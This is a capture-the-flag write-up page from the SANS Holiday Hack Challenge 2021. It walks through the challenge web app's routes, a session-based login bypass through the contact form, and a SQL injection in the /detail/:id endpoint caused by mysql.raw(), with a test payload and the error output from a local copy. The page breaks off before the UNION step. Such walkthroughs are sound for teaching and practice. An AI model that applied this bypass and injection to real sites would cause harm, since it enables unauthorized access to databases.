
<!DOCTYPE html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SQL Injection &#8212; SANS Xmas Challenge 2021</title>
    
  <link rel="stylesheet" href="static/css/index.73d71520a4ca3b99cfee5594769eaaae.css">

    
  <link rel="stylesheet"
    href="static/vendor/fontawesome/5.13.0/css/all.min.css">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">

    
      
  <link rel="stylesheet"
    href="static/vendor/open-sans_all/1.44.1/index.css">
  <link rel="stylesheet"
    href="static/vendor/lato_latin-ext/1.44.1/index.css">

    
    <link rel="stylesheet" href="static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="static/sphinx-book-theme.40e2e510f6b7d1648584402491bb10fe.css" type="text/css" />
    <link rel="stylesheet" type="text/css" href="static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
    <link rel="stylesheet" type="text/css" href="static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
    
  <link rel="preload" as="script" href="static/js/index.3da636dd464baa7582d2.js">

    <script id="documentation_options" data-url_root="./" src="static/documentation_options.js"></script>
    <script src="static/jquery.js"></script>
    <script src="static/underscore.js"></script>
    <script src="static/doctools.js"></script>
    <script src="static/language_data.js"></script>
    <script src="static/togglebutton.js"></script>
    <script src="static/clipboard.min.js"></script>
    <script src="static/copybutton.js"></script>
    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="static/sphinx-book-theme.d31b09fe5c1d09cb49b26a786de4a05d.js"></script>
    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
    <script >
        const thebe_selector = ".thebe"
        const thebe_selector_input = "pre"
        const thebe_selector_output = ".output"
    </script>
    <script async="async" src="static/sphinx-thebe.js"></script>
    <link rel="index" title="Index" href="genindex.html" />
    <link rel="search" title="Search" href="search.html" />
    <link rel="next" title="13. FPGA Programming" href="objective13.html" />
    <link rel="prev" title="Python Game" href="prechallenge12.html" />

    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="docsearch:language" content="en" />



  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
<a class="navbar-brand text-wrap" href="index.html">
  
  <img src="static/logo.png" class="logo" alt="logo">
  
  
  <h1 class="site-logo" id="site-title">SANS Xmas Challenge 2021</h1>
  
</a>
</div><form class="bd-search d-flex align-items-center" action="search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form>
<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
    <ul class="nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="intro.html">
   Christmas Challenge 2021 Report
  </a>
 </li>
</ul>
<ul class="current nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="objective1.html">
   1. The Beginning
  </a>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective2.html">
   2. Caramel Santaigo
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge2.html">
     Exif Metadata
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge2.html">
     Track the Elf!
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective3.html">
   3. Thaw Frost Tower’s Entrance
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge3.html">
     Grepping for Gold
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge3.html">
     WiFi &amp; Door Defrost
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective4.html">
   4. Slot Machine Investigation
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge4.html">
     Logic Munchers
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge4.html">
     Slot Machine Hijack
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective5.html">
   5. Strange USB Device
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge5.html">
     IPv6 Sandbox
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge5.html">
     Rubber Ducky
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective6.html">
   6. Shellcode Primer
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge6.html">
     Holiday Hero
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge6.html">
     Assembly x86
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective7.html">
   7. Printer Exploitation
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="challenge7.html">
     Printer Exploitation
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective8.html">
   8. Kerberoasting
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge8.html">
     HoHo… No (Fail2Ban)
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge8.html">
     Windows AD Exploit
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective9.html">
   9. Splunk!
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge9.html">
     YARA Analysis
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge9.html">
     Splunk
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective10.html">
   10. Now Hiring!
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge10.html">
     IMDS Exploration
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge10.html">
     Frost Tower Challenge
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective11.html">
   11. Customer Complaint Analysis
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge11.html">
     Strace Ltrace Retrace
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge11.html">
     Wireshark
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 current active collapsible-parent">
  <a class="reference internal" href="objective12.html">
   12. Frost Tower Website Checkup
  </a>
  <ul class="current collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge12.html">
     Python Game
    </a>
   </li>
   <li class="toctree-l2 current active">
    <a class="current reference internal" href="#">
     SQL Injection
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
 <li class="toctree-l1 collapsible-parent">
  <a class="reference internal" href="objective13.html">
   13. FPGA Programming
  </a>
  <ul class="collapse-ul">
   <li class="toctree-l2">
    <a class="reference internal" href="prechallenge13.html">
     FPGA Programming - Prechallenge
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="challenge13.html">
     FPGA Programming - Challenge
    </a>
   </li>
  </ul>
  <i class="fas fa-chevron-down">
  </i>
 </li>
</ul>

</nav> <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="row topbar fixed-top container-xl">
    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
    </div>
    <div class="col pl-2 topbar-main">
        
        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
            <i class="fas fa-bars"></i>
            <i class="fas fa-arrow-left"></i>
            <i class="fas fa-arrow-up"></i>
        </button>
        
        
<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="sources/challenge12.md"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.md</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
</div>

        <!-- Source interaction buttons -->


        <!-- Full screen (wrap in <a> to have style consistency -->
        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
                data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
                title="Fullscreen mode"><i
                    class="fas fa-expand"></i></button></a>

        <!-- Launch buttons -->

    </div>

    <!-- Table of contents -->
    <div class="d-none d-md-block col-md-2 bd-toc show">
        
        <div class="tocsection onthispage pt-5 pb-3">
            <i class="fas fa-list"></i> Contents
        </div>
        <nav id="bd-toc-nav">
            <ul class="nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#goal">
   Goal
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#api-list">
   API list
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#sessions">
   Sessions
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#the-sql-injection-point">
   The SQL Injection Point
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#template-dateformat-error">
   Template dateFormat error
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#first-contstraint">
   First Contstraint
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#second-contstraint">
   Second Contstraint
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#recap">
   Recap
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#the-sql">
   The SQL
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#others-sql">
   others SQL
  </a>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#little-appendix">
   Little Appendix:
  </a>
 </li>
</ul>

        </nav>
        
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
        
              <div>
                
  <div class="section" id="sql-injection">
<span id="ch12"></span><h1>SQL Injection<a class="headerlink" href="#sql-injection" title="Permalink to this headline">¶</a></h1>
<div class="section" id="goal">
<span id="ch12-goal"></span><h2>Goal<a class="headerlink" href="#goal" title="Permalink to this headline">¶</a></h2>
<p><b> In Jack Frost’s TODO list, what job position does Jack plan to offer Santa?</b></p>
<p>Ribb Bonbowford gives us some important clues about the assessment required to the Jack Frost Web service running at <a class="reference external" href="https://staging.jackfrosttower.com">(https://staging.jackfrosttower.com)</a>.
It seems it is vulnerable to some SQL Injection.<br/>
He gives us also some useful docs:
<br/><a class="reference external" href="https://github.com/mysqljs/mysql">(https://github.com/mysqljs/mysql)</a>
<br/><a class="reference external" href="https://www.npmjs.com/package/express-session">(https://www.npmjs.com/package/express-session)</a></p>
<p>and last but not least, we have the entire source code <a class="reference external" href="https://download.holidayhackchallenge.com/2021/frosttower-web.zip">(here)</a>
<br/></p>
</div>
<div class="section" id="api-list">
<h2>API list<a class="headerlink" href="#api-list" title="Permalink to this headline">¶</a></h2>
<p>First of all, let’s grab a menu from the source code we have been kindly given.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>

<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/adduser&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>          <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">){</span> <span class="p">(</span><span class="n">AND</span> <span class="n">session</span><span class="o">.</span><span class="n">userstatus</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">redir</span> <span class="n">dashboard</span><span class="p">)</span>
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/adduser&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>         <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">){</span> <span class="p">(</span><span class="n">AND</span> <span class="n">session</span><span class="o">.</span><span class="n">userstatus</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">redir</span> <span class="n">dashboard</span><span class="p">)</span>
 
<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/contact&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>

<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/dashboard&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>        <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">){</span>
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/delete/:id&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>       <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">)</span>    <span class="n">AND</span> <span class="n">session</span><span class="o">.</span><span class="n">userstatus</span> <span class="o">==</span> <span class="mi">1</span>  <span class="o">...</span> 
<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/detail/:id&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>      <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">){</span>
 
<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/edit/:id&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>        <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">){</span>
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/edit/:id&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>         <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">){</span>  <span class="o">.......</span> <span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span> <span class="o">=</span> <span class="n">fullname</span>  <span class="p">:)</span>
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/export&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>           <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">){</span>

<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/forgotpass&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">){</span>
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/forgotpass&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>
<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/forgotpass/token/:id&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/forgotpass/token/:id&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>

<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">){</span>
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>             <span class="o">//</span> <span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">username</span>
<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">){</span>

<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/postcontact&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>      <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">rowlength</span> <span class="o">&gt;=</span> <span class="s2">&quot;1&quot;</span><span class="p">){</span>
                                                            <span class="n">session</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">session</span><span class="p">;</span>
                                                            <span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span> <span class="o">=</span> <span class="n">email</span><span class="p">;</span>

<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/redirect&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">){</span>               <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">){</span> 
 
<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>          <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">){</span>
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>          <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">){</span>

<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/useredit/:id&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>    <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">)</span>    <span class="n">AND</span> <span class="n">session</span><span class="o">.</span><span class="n">userstatus</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">...</span> 
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/useredit/:id&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>    <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">)</span>    <span class="n">AND</span> <span class="n">session</span><span class="o">.</span><span class="n">userstatus</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">...</span>
<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/userlist&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>         <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">)</span>    <span class="n">AND</span> <span class="n">session</span><span class="o">.</span><span class="n">userstatus</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">...</span>
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/userdelete/:id&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>   <span class="o">//</span> <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">uniqueID</span><span class="p">)</span>    <span class="n">AND</span> <span class="n">session</span><span class="o">.</span><span class="n">userstatus</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">...</span>

<span class="n">get</span>  <span class="p">(</span><span class="s1">&#39;/testsite&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">)</span> <span class="p">{</span>
<span class="n">post</span> <span class="p">(</span><span class="s1">&#39;/testsite&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="nb">next</span><span class="p">){</span>
</pre></div>
</div>
</div>
<div class="section" id="sessions">
<h2>Sessions<a class="headerlink" href="#sessions" title="Permalink to this headline">¶</a></h2>
<p>It seems that trying to access those endpoints we receive always the request of a login.
<br />First thing to do is to view how the login works then.
<br/>
The entrypoint that get our attention is the /postcontact, let’s have a look:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>app.post(&#39;/postcontact&#39;, function(req, res, next){
    var fullname = xss( req.body.fullname );
    var email = xss(  req.body.email );
    var phone = xss( req.body.phone );
    var country = xss( req.body.country  );
    var date = new Date();
    var d = date.getDate();
    var mo = date.getMonth();
    var yr = date.getFullYear();
    var current_hour = date.getHours();
    var date_created = &quot;2021-12-22 00:39:10&quot;;

    tempCont.query(&quot;SELECT * from uniquecontact where email=&quot;+tempCont.escape(email), function(error, rows, fields){

        if (error) {
            console.log(error);
            return res.sendStatus(500);
        }

        var rowlength = rows.length;
        if (rowlength &gt;= &quot;1&quot;){
            session = req.session;
            session.uniqueID = email;          &lt;===================== here, here, here!!!
            req.flash(&#39;info&#39;, &#39;Email Already Exists&#39;);
            res.redirect(&quot;/contact&quot;);

.........
</pre></div>
</div>
<p>it says that if we use (in the contact form) as email an email that was already inserted … then
we will obtain to populate the variabile <code class="docutils literal notranslate"><span class="pre">session.uniqueID</span></code> with that email string. This sounds good
because sometimes <code class="docutils literal notranslate"><span class="pre">session.uniqueID</span></code> is the only session var that is evaluated and that gives you authorization
access to further reserved pages (as you can notice in the code above).
<br /></p>
<p>For sure, up to now, we know that: <br/>
inserting an email in the page index we populate the table: <code class="docutils literal notranslate"><span class="pre">emails</span></code><br/>
inserting an email in the page contact we populate the table: <code class="docutils literal notranslate"><span class="pre">uniquecontact</span></code> (this is needed to bypass the login)
<br/>
we are able to access the endpoint: /dashboard  and to see all the values inserted in the <code class="docutils literal notranslate"><span class="pre">uniquecontact</span></code> table<br/>
we are able to access the endpoint: /detail/[integer]
<br/>
That’s a good start!<br/></p>
</div>
<div class="section" id="the-sql-injection-point">
<h2>The SQL Injection Point<a class="headerlink" href="#the-sql-injection-point" title="Permalink to this headline">¶</a></h2>
<p>By analizing the source code in server.js we have to find some clue to discover where a sql injection is possible.
All the params are correctly escaped in every sqlstring …. except one.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>app.get(&#39;/detail/:id&#39;, function(req, res, next) {
    session = req.session;
    var reqparam = req.params[&#39;id&#39;];
    var query = &quot;SELECT * FROM uniquecontact WHERE id=&quot;;

    if (session.uniqueID){

        try {
            if (reqparam.indexOf(&#39;,&#39;) &gt; 0){
                var ids = reqparam.split(&#39;,&#39;);
                reqparam = &quot;0&quot;;
                for (var i=0; i&lt;ids.length; i++){
                    query += tempCont.escape(m.raw(ids[i]));   // &lt;======== possible SQL INJ !!!!!!
                    query += &quot; OR id=&quot;
                }
                query += &quot;?&quot;;
            }else{
                query = &quot;SELECT * FROM uniquecontact WHERE id=?&quot;
            }
        } catch (error) {
            console.log(error);
            return res.sendStatus(500);
        }
....
</pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>from the <a class="reference external" href="https://github.com/mysqljs/mysql#escaping-query-values">(doc)</a><br/>
To generate objects with a toSqlString method, the mysql.raw() method can be used. This creates an object that will be left un-touched when using in a ? placeholder, useful for using functions as dynamic values:</p>
<p><b>Caution</b> The string provided to mysql.raw() will skip all escaping functions when used, so be careful when passing in unvalidated input.</p>
</div>
<p>After installing all the libs (node,npm,mariadb) required and downgraded the dateformat lib, we were able to have a local server
running the affected code. <br/>
Here we go, let’s try a simple test</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1155</span><span class="o">/</span><span class="n">detail</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span><span class="n">a1</span><span class="o">=</span><span class="mi">2</span>
</pre></div>
</div>
<p>we can see in the logs of the web service</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">code</span><span class="p">:</span> <span class="s1">&#39;ER_BAD_FIELD_ERROR&#39;</span><span class="p">,</span>
  <span class="n">errno</span><span class="p">:</span> <span class="mi">1054</span><span class="p">,</span>
  <span class="n">sqlMessage</span><span class="p">:</span> <span class="s2">&quot;Unknown column &#39;a1&#39; in &#39;where clause&#39;&quot;</span><span class="p">,</span>
  <span class="n">sqlState</span><span class="p">:</span> <span class="s1">&#39;42S22&#39;</span><span class="p">,</span>
  <span class="n">index</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="n">sql</span><span class="p">:</span> <span class="s2">&quot;SELECT * FROM uniquecontact WHERE id=2 OR id=a1=2 OR id=&#39;0&#39;&quot;</span>

</pre></div>
</div>
<p>so every parameters passed after a comma is appended to the column ‘id’ and concatenated to the where sql string (as of the code).
<br/>Let’s try with a UNION! ….. we have just 2 tables in our local db file with the same numbers of columns: users and uniquecontact  ;)
<br/>Do not forget that we have to insert some records in the users table first, otherwise we won’t see anything!<br/></p>
